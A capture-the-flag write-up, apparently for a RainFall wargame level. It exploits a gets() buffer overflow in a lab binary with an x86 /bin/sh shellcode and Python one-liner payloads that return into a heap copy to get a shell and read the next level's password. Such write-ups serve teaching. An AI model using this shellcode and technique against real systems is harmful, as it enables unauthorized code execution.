# Level 2

## Requirements

- See level0.

## Walkthrough

1. Login

	```sh
	> ssh -p 4242 level2@192.168.1.66
	Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

	GCC stack protector support:            Enabled
	Strict user copy checks:                Disabled
	Restrict /dev/mem access:               Enabled
	Restrict /dev/kmem access:              Enabled
	grsecurity / PaX: No GRKERNSEC
	Kernel Heap Hardening: No KERNHEAP
	System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
	RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
	No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
	```

1. What do we have?

	```sh
	# Waiting for an input
	> ./level1
	qwe
	qwe

	# Even with an argument, it still wait for input
	> ./level1 qwe
	asd
	asd
	```

1. From those short test, we just see that arguments are ignored and input is printed back. Let's copy the file to decompile it again.

	```sh
	# On Host
	> cd level2; mkdir Ida; scp -P 4242 level2@192.168.1.66:~/level2 ./Ida/level2
	Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
	```

1. Desassembling it, we notice that our `main` function only calls another function `p`.

	```sh
	> gdb level2
	...

	> (gdb) disas main
	Dump of assembler code for function main:
		0x0804853f <+0>:	push   %ebp
		0x08048540 <+1>:	mov    %esp,%ebp
		0x08048542 <+3>:	and    $0xfffffff0,%esp
		0x08048545 <+6>:	call   0x80484d4 <p>
		0x0804854a <+11>:	leave
		0x0804854b <+12>:	ret
	End of assembler dump.
	```

	```asm
	.text:0804853F ; int __cdecl main(int argc, const char **argv, const char **envp)
	.text:0804853F                 public main
	.text:0804853F main            proc near               ; DATA XREF: _start+17↑o
	.text:0804853F
	.text:0804853F argc            = dword ptr  8
	.text:0804853F argv            = dword ptr  0Ch
	.text:0804853F envp            = dword ptr  10h
	.text:0804853F
	.text:0804853F ; __unwind {
	.text:0804853F                 push    ebp
	.text:08048540                 mov     ebp, esp
	.text:08048542                 and     esp, 0FFFFFFF0h
	.text:08048545                 call    p
	.text:0804854A                 leave
	.text:0804854B                 retn
	.text:0804854B ; } // starts at 804853F
	.text:0804854B main            endp
	```

	```c
	int main(int argc, const char **argv, const char **envp)
	{
		return p();
	}
	```

1. Fair enough. Deep dive into the harsh reality.

	```sh
	(gdb) disas p
	Dump of assembler code for function p:
		0x080484d4 <+0>:	push   %ebp
		0x080484d5 <+1>:	mov    %esp,%ebp
		0x080484d7 <+3>:	sub    $0x68,%esp
		0x080484da <+6>:	mov    0x8049860,%eax
		0x080484df <+11>:	mov    %eax,(%esp)
		0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
		0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
		0x080484ea <+22>:	mov    %eax,(%esp)
		0x080484ed <+25>:	call   0x80483c0 <gets@plt>
		0x080484f2 <+30>:	mov    0x4(%ebp),%eax
		0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
		0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
		0x080484fb <+39>:	and    $0xb0000000,%eax
		0x08048500 <+44>:	cmp    $0xb0000000,%eax
		0x08048505 <+49>:	jne    0x8048527 <p+83>
		0x08048507 <+51>:	mov    $0x8048620,%eax
		0x0804850c <+56>:	mov    -0xc(%ebp),%edx
		0x0804850f <+59>:	mov    %edx,0x4(%esp)
		0x08048513 <+63>:	mov    %eax,(%esp)
		0x08048516 <+66>:	call   0x80483a0 <printf@plt>
		0x0804851b <+71>:	movl   $0x1,(%esp)
		0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
		0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
		0x0804852a <+86>:	mov    %eax,(%esp)
		0x0804852d <+89>:	call   0x80483f0 <puts@plt>
		0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
		0x08048535 <+97>:	mov    %eax,(%esp)
		0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
		0x0804853d <+105>:	leave
		0x0804853e <+106>:	ret
	End of assembler dump.
	```

	```asm
	.text:080484D4 ; int p()
	.text:080484D4                 public p
	.text:080484D4 p               proc near               ; CODE XREF: main+6↓p
	.text:080484D4
	.text:080484D4 buffer          = byte ptr -4Ch
	.text:080484D4 ptr             = dword ptr -0Ch
	.text:080484D4 addr            = byte ptr  4
	.text:080484D4
	.text:080484D4 ; __unwind {
	.text:080484D4                 push    ebp
	.text:080484D5                 mov     ebp, esp
	.text:080484D7                 sub     esp, 68h
	.text:080484DA                 mov     eax, ds:stdout@@GLIBC_2_0
	.text:080484DF                 mov     [esp], eax
	.text:080484E2                 call    _fflush
	.text:080484E7                 lea     eax, [ebp+buffer]
	.text:080484EA                 mov     [esp], eax
	.text:080484ED                 call    _gets
	.text:080484F2                 mov     eax, dword ptr [ebp+addr]
	.text:080484F5                 mov     [ebp+ptr], eax
	.text:080484F8                 mov     eax, [ebp+ptr]
	.text:080484FB                 and     eax, 0B0000000h
	.text:08048500                 cmp     eax, 0B0000000h
	.text:08048505                 jnz     short loc_8048527
	.text:08048507                 mov     eax, offset aP  ; "(%p)\n"
	.text:0804850C                 mov     edx, [ebp+ptr]
	.text:0804850F                 mov     [esp+4], edx
	.text:08048513                 mov     [esp], eax
	.text:08048516                 call    _printf
	.text:0804851B                 mov     dword ptr [esp], 1
	.text:08048522                 call    __exit
	.text:08048527
	.text:08048527 loc_8048527:                            ; CODE XREF: p+31↑j
	.text:08048527                 lea     eax, [ebp+buffer]
	.text:0804852A                 mov     [esp], eax
	.text:0804852D                 call    _puts
	.text:08048532                 lea     eax, [ebp+buffer]
	.text:08048535                 mov     [esp], eax
	.text:08048538                 call    _strdup
	.text:0804853D                 leave
	.text:0804853E                 retn
	.text:0804853E ; } // starts at 80484D4
	.text:0804853E p               endp
	```

	```c
	int p()
	{
		char buffer[64]; // [esp+1Ch] [ebp-4Ch] BYREF
		const void *addr; // [esp+5Ch] [ebp-Ch]
		unsigned int retaddr; // [esp+6Ch] [ebp+4h]

		fflush(stdout);
		gets(buffer);
		addr = (const void *)retaddr;
		if ( (retaddr & 0xB0000000) == 0xB0000000 )
		{
			printf("(%p)\n", addr);
			_exit(1);
		}
		puts(buffer);
		return strdup(buffer);
	}
	```

1. Again, we have a call to `gets`, but also to some new functions `puts`, `strdup`.

	```
	- `puts` - writes the string s and a trailing newline to stdout.
	- `strdup` - returns a pointer to a new string which is a duplicate of the string s.  Memory for the new string is obtained with malloc.
	```

1. Like in the previous level, we might have to exploit `gets` with a buffer overflow, however, we don't have any system call to a Shell, therefore, we might have to inject it ourselves (aka. Shellcode Injection), but to do so we have to know our system architecture first.

	```sh
	> uname -a
	Linux RainFall 3.2.0-90-generic-pae #128-Ubuntu SMP Fri Aug 14 22:16:51 UTC 2015 i686 i686 i386 GNU/Linux
	```

1. Good, we now know what kind of Shellcode we are going to need ( x86 = 32 bits ). Let's find one on `shell-storm.org/shellcode`.

	```c
	// https://shell-storm.org/shellcode/files/shellcode-811.html
	unsigned char code[28] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";
	```

1. Fine, now first of all, like in previous level, we find out about the size we have to fill up. Let's use the same technique (use of pattern).

	```sh
	# Breakpoint on `main`, `gets` then run
	> (gdb) r
	Starting program: /home/user/level2/level2

	Breakpoint 2, 0x08048542 in main ()
	> (gdb) step
	Single stepping until exit from function main,
	which has no line number information.

	Breakpoint 1, 0xb7e91e40 in gets () from /lib/i386-linux-gnu/libc.so.6

	# Check registers ( `eax`  contains the buffer address )
	> (gdb) i r
	eax            0xbffff6dc	-1073744164
	ecx            0xb7fd28b8	-1208145736
	edx            0x0	0
	ebx            0xb7fd0ff4	-1208152076
	esp            0xbffff6bc	0xbffff6bc
	ebp            0xbffff728	0xbffff728
	esi            0x0	0
	edi            0x0	0
	eip            0xb7e91e40	0xb7e91e40 <gets>
	eflags         0x200292	[ AF SF IF ID ]
	cs             0x73	115
	ss             0x7b	123
	ds             0x7b	123
	es             0x7b	123
	fs             0x0	0
	gs             0x33	51

	# Provide our pattern
	> (gdb) step
	Single stepping until exit from function gets,
	which has no line number information.
	AAaaAAbbAAccAAddAAeeAAffAAggAAhhAAiiAAjjAAkkAAllAAmmAAnnAAooAAppAAqqAArrAAssAAttAAuuAAvvAAwwAAxxAAyyAAzz
	0x080484f2 in p ()

	# Check the current frame
	> (gdb) i f
	Stack level 0, frame at 0xbffff730:
	eip = 0x80484f2 in p; saved eip 0x75754141
	called by frame at 0xbffff734
	Arglist at 0xbffff728, args:
	Locals at 0xbffff728, Previous frame's sp is 0xbffff730
	Saved registers:
	ebp at 0xbffff728, eip at 0xbffff72c

	# Check registers
	> (gdb) i r
	eax            0xbffff6dc	-1073744164
	ecx            0xb7fd28c4	-1208145724
	edx            0xbffff6dc	-1073744164
	ebx            0xb7fd0ff4	-1208152076
	esp            0xbffff6c0	0xbffff6c0
	ebp            0xbffff728	0xbffff728
	esi            0x0	0
	edi            0x0	0
	eip            0x80484f2	0x80484f2 <p+30>
	eflags         0x210282	[ SF IF RF ID ]
	cs             0x73	115
	ss             0x7b	123
	ds             0x7b	123
	es             0x7b	123
	fs             0x0	0
	gs             0x33	51

	# Check the stack
	> (gdb) x/52x $sp
	0xbffff6c0:	0xbffff6dc	0x00000000	0x00000000	0xb7e5ec73
	0xbffff6d0:	0x080482b5	0x00000000	0x00ca0000	0x61614141
	0xbffff6e0:	0x62624141	0x63634141	0x64644141	0x65654141
	0xbffff6f0:	0x66664141	0x67674141	0x68684141	0x69694141
	0xbffff700:	0x6a6a4141	0x6b6b4141	0x6c6c4141	0x6d6d4141
	0xbffff710:	0x6e6e4141	0x6f6f4141	0x70704141	0x71714141
	0xbffff720:	0x72724141	0x73734141	0x74744141	0x75754141
	0xbffff730:	0x76764141	0x77774141	0x78784141	0x79794141
	0xbffff740:	0x7a7a4141	0xbffff700	0xbffff7dc	0xb7fdc858
	0xbffff750:	0x00000000	0xbffff71c	0xbffff7dc	0x00000000
	0xbffff760:	0x08048260	0xb7fd0ff4	0x00000000	0x00000000
	0xbffff770:	0x00000000	0x5e3c472f	0x697be33f	0x00000000
	0xbffff780:	0x00000000	0x00000000	0x00000001	0x08048420

	# Continue step by step
	(gdb) step
	Single stepping until exit from function p, which has no line number information.
	AAaaAAbbAAccAAddAAeeAAffAAggAAhhAAiiAAjjAAkkAAllAAmmAAnnAAooAAppAAuuAArrAAssAAttAAuuAAvvAAwwAAxxAAyyAAzz
	Warning:
	Cannot insert breakpoint 0.
	Error accessing memory address 0x76764141: Input/output error.

	0x75754141 in ?? ()

	# Check frame
	(gdb) i f
	Stack level 0, frame at 0xbffff734:
	eip = 0x75754141; saved eip 0x76764141
	called by frame at 0xbffff738
	Arglist at 0xbffff72c, args:
	Locals at 0xbffff72c, Previous frame's sp is 0xbffff734
	Saved registers:
	eip at 0xbffff730

	# Check registers
	(gdb) i r
	eax            0x804a008	134520840
	ecx            0x0	0
	edx            0xbffff6dc	-1073744164
	ebx            0xb7fd0ff4	-1208152076
	esp            0xbffff730	0xbffff730
	ebp            0x74744141	0x74744141
	esi            0x0	0
	edi            0x0	0
	eip            0x75754141	0x75754141
	eflags         0x210282	[ SF IF RF ID ]
	cs             0x73	115
	ss             0x7b	123
	ds             0x7b	123
	es             0x7b	123
	fs             0x0	0
	gs             0x33	51

	# Continue till end
	> (gdb) c
	Continuing.

	Program received signal SIGSEGV, Segmentation fault.
	0x75754141 in ?? ()
	```

1. Fine, so our buffer address is `0xbffff6dc` (`0xbffff6d0` + `0xc`), and our return address is located at `0xbffff72c` (`0xbffff720` + `0xc`), therefore, we have a 80 characters gap.

	```sh
	> (gdb) p/d 0xbffff72c - 0xbffff6dc
	$1 = 80
	```

1. However, since our Shellcode is 28 bytes long, we have 52 bytes ( 80 - 28  = 52 ) to fill with whatever.

	```sh
	> python -c "print 'a' * 52"
	aaa...aaa
	```

1. Perfect! We have our Shellcode store address to return to, `0xbffff6dc`. Let's give it a try.

	```sh
	# Like in previous level, we have to provide address in little-endian
	> (python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'a' * 52 + '\xdc\xf6\xff\xbf'" ; cat) | ./level2

	(0xbffff6dc)
	qwe
	```

1. It works, but unfortunatly, the return address is protected...

	```c
	if ( (retaddr & 0xB0000000) == 0xB0000000 )
	{
		printf("(%p)\n", addr);
		_exit(1);
	}
	```

1. Hence, we cannot use `stack` addresses since they start with `0xB`. Thanks to the `strdup`, our payload is also loaded into the `heap`, let's find out.

	```sh
	> gdb level2
	...

	# Add breakpoint before `strdup` then run
	> (gdb) b strdup
	Breakpoint 1 at 0x80483e0
	> (gdb) r
	Starting program: /home/user/level2/level2
	qweqweqwe
	qweqweqwe

	Breakpoint 1, 0xb7ea8d30 in strdup () from /lib/i386-linux-gnu/libc.so.6

	# Check Process Map
	> (gdb) info proc map
	process 3611
	Mapped address spaces:
		Start Addr   End Addr       Size     Offset objfile
		0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
		0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
		0xb7e2b000 0xb7e2c000     0x1000        0x0
		0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
		0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
		0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
		0xb7fd2000 0xb7fd5000     0x3000        0x0
		0xb7fd9000 0xb7fdd000     0x4000        0x0
		0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
		0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
		0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
		0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
		0xbffdf000 0xc0000000    0x21000        0x0 [stack]

	# Move forward until `strdup` returns
	> (gdb) step
	Single stepping until exit from function strdup,
	which has no line number information.
	0x0804853d in p ()
	> (gdb) step
	Single stepping until exit from function p,
	which has no line number information.
	0x0804854a in main ()

	# Check back Process Map
	> (gdb) info proc map
	process 3611
	Mapped address spaces:
		Start Addr   End Addr       Size     Offset objfile
		0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
		0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
		0x804a000  0x806b000    0x21000        0x0 [heap]
		0xb7e2b000 0xb7e2c000     0x1000        0x0
		0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
		0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
		0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
		0xb7fd2000 0xb7fd5000     0x3000        0x0
		0xb7fd9000 0xb7fdd000     0x4000        0x0
		0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
		0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
		0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
		0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
		0xbffdf000 0xc0000000    0x21000        0x0 [stack]

	# Verify that the `heap` block contains our `payload`
	> (gdb) find 0x804a000,+999999,"qweqweqwe"
	0x804a008
	warning: Unable to access target memory at 0x8069412, halting search.
	1 pattern found.
	> (gdb) x/s 0x804a008
	0x804a008:	 "qweqweqwe"
	> (gdb) c
	Continuing.
	[Inferior 1 (process 3611) exited with code 010]
	```

1. Time to update our previous script with our newly found payload address.

	```sh
	> (python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'a' * 52 + '\x08\xa0\x04\x08'" ; cat) | ./level2

	1�Ph//shh/bin����°
					1�@̀aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�
	whoami
	level3
	```

1. Let's Goooo! Get the flag!

	```sh
	> (python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'a' * 52 + '\x08\xa0\x04\x08'" ; cat) | ./level2

	...
	cd ../level3
	cat .pass
	492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
	```

## Documentation

- Function: [puts](https://man7.org/linux/man-pages/man3/puts.3.html)
- Function: [strdup](https://man7.org/linux/man-pages/man3/strdup.3.html)
- Resource: [YouTube](https://www.youtube.com/watch?v=HSlhY4Uy8SA)
